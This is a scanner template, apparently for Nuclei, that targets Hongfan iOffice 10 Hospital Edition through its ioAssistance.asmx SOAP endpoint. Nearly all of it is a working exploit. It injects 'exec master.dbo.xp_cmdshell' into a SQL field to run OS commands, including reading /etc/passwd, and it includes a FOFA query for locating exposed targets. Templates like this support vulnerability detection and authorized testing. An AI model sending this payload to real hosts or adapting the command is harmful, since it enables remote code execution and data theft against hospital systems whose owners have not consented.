common/config/pocs/hongfan-ioffice-rce.yaml

http:
    - matchers:
        - condition: or
          part: body
          regex:
            - Windows IP
            - 'root:.*:0:0:'
          type: regex
        - part: header
          type: word
          words:
            - text/xml
        - status:
            - 200
          type: status
      matchers-condition: and
      payloads:
        command:
            - /bin/bash -c "cat /etc/passwd"
            - cmd /c ipconfig
      raw:
        - |
          POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/xml; charset=utf-8

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
                <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
              </GetLoginedEmpNoReadedInf>
            </soap:Body>
          </soap:Envelope>
id: hongfan-ioffice-rce
info:
    author: SleepingBag945
    description: |
        There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.
    metadata:
        fofa-query: app="红帆-ioffice"
        max-request: 2
        verified: true
    name: Hongfan OA ioAssistance.asmx - Remote Code Execution
    reference:
        - https://github.com/FridaZhbk/pocscan/blob/main/%E7%BA%A2%E5%B8%86/oa%E7%BA%A2%E5%B8%86ioAssistance.asmx%E6%B3%A8%E5%85%A5RCE.py
    severity: high
    tags:
        - hongfan
        - 红帆-ioffice
        - Ioa
